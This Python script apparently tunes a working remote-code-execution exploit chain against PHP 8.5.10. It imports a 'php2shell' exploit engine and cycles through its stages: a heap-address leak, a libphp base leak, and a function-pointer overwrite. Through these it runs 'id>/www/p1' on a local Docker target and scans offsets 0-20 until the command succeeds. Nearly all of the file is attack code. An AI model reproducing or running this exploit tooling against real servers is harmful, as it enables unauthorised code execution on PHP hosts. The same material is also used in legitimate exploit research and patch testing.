#!/usr/bin/env python3
"""Scan carrier b2_pre (0-20) for 8.5.10 amd64 — find the value that lands the 15B carrier
on PS(http_session_vars). Uses the php2shell.py Exploit engine directly."""
import sys, time, urllib.parse
sys.path.insert(0, r"C:\Users\likat\p2s52704\test\poc8510")
import importlib.util
spec = importlib.util.spec_from_file_location("p2s",
    r"C:\Users\likat\p2s52704\test\poc8510\php2shell.py")
p2s = importlib.util.module_from_spec(spec); spec.loader.exec_module(p2s)

HOST, PORT, TLS = "127.0.0.1", 18116, False
CFG = p2s.VERSIONS["8.5.10"]
CMD = b"id>/www/p1"
BASE = "http://%s:%d" % (HOST, PORT)

def http_get(url, timeout=12.0):
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        try: return e.code, e.read()
        except Exception: return e.code, b""
    except Exception as e:
        return 0, str(e).encode()

def run_chain(b2_pre, htdata):
    t = p2s.Target(BASE + "/", timeout=30)
    ex = p2s.Exploit(t, CMD.decode(), CFG["zif"], CFG["dtor"], htdata)
    ex.stage3_b2_pre = b2_pre
    ex.rotate()
    chunk = 0
    for _ in range(4):
        ex.rotate(); chunk = ex.stage1()
        if chunk: break
    if not chunk: return None
    ex.rotate()
    libphp = 0
    for _ in range(4):
        ex.rotate(); libphp = ex.stage2()
        if libphp: break
    if not libphp: return None
    zif = libphp + CFG["zif"]
    ex.stage3(chunk + htdata, zif)
    time.sleep(0.8)
    return (chunk, libphp)

def main():
    import subprocess
    for b2p in range(0, 21):
        t0 = time.time()
        try:
            st = http_get(BASE + "/p1")
            if st[0] == 200 and b"uid=" in st[1]:
                print("  (stale /p1 present before b2p=%d)" % b2p, flush=True)
            run_chain(b2p, CFG["htdata"])
        except Exception as e:
            print("  b2p=%d ERR %r" % (b2p, e), flush=True)
            continue
        code, body = http_get(BASE + "/p1")
        ok = (code == 200 and b"uid=" in body)
        print("b2p=%2d  %5.1fs  /p1->%d %s" % (b2p, time.time()-t0, code,
              repr(body[:60]) if ok else "-"), flush=True)
        if ok:
            print("!!! FOUND b2_pre=%d  %s" % (b2p, body.decode().strip()), flush=True)
            return 0
        # clean up for next attempt
        subprocess.run(["docker", "exec", "p2s8510", "sh", "-c",
                        "rm -f /www/p1; echo x> /www/p1; rm -f /www/p1"],
                       capture_output=True)
    print("no b2_pre in 0-20 landed", flush=True)
    return 1

if __name__ == "__main__":
    sys.exit(main())
